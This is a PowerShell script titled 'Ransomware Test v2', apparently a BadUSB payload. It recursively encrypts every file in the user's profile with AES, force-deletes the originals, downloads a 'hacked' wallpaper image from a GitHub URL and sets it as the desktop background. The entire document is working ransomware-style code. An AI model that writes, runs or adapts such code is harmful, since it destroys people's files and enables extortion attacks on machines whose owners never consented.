# == Ransomware Test v2 ==
$log = "$env:TEMP\ransom-log.txt"
Add-Content $log "`n===== START $(Get-Date) ====="

$key = [Convert]::FromBase64String("MDEyMzQ1Njc4OWFiY2RlZgAxMjM0NTY3ODlhYmNkZWY=")
$iv  = [Convert]::FromBase64String("MDEyMzQ1Njc4OWFiY2RlZg==")
$root = $env:USERPROFILE
$wallpaperUrl = "https://raw.githubusercontent.com/ninakisyova/flipperzero-badUSB/main/hacked-wallpaper.png"
$wallpaperPath = "$env:TEMP\hacked-wallpaper.png"

# == Encrypt Files ==
try {
    Add-Content $log "Encrypting files under $root"
    Get-ChildItem -Path $root -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $data = [IO.File]::ReadAllBytes($_.FullName)
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $key
            $aes.IV = $iv
            $enc = New-Object IO.MemoryStream
            $cs = New-Object Security.Cryptography.CryptoStream($enc, $aes.CreateEncryptor(), 'Write')
            $cs.Write($data, 0, $data.Length)
            $cs.Close()
            [IO.File]::WriteAllBytes("$($_.FullName).enc", $enc.ToArray())
            Remove-Item $_.FullName -Force
            Add-Content $log "Encrypted: $($_.FullName)"
        } catch {
            Add-Content $log "FAILED: $($_.FullName)"
        }
    }
} catch {
    Add-Content $log "Top-level encryption failed: $_"
}

# == Change Wallpaper ==
try {
    Invoke-WebRequest -Uri $wallpaperUrl -OutFile $wallpaperPath
    Add-Content $log "Wallpaper downloaded"

    $code = @"
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
    Add-Type $code
    [Wallpaper]::SystemParametersInfo(20, 0, $wallpaperPath, 3)
    Add-Content $log "Wallpaper changed successfully"
} catch {
    Add-Content $log "Wallpaper FAILED: $_"
}

Add-Content $log "===== END ====="
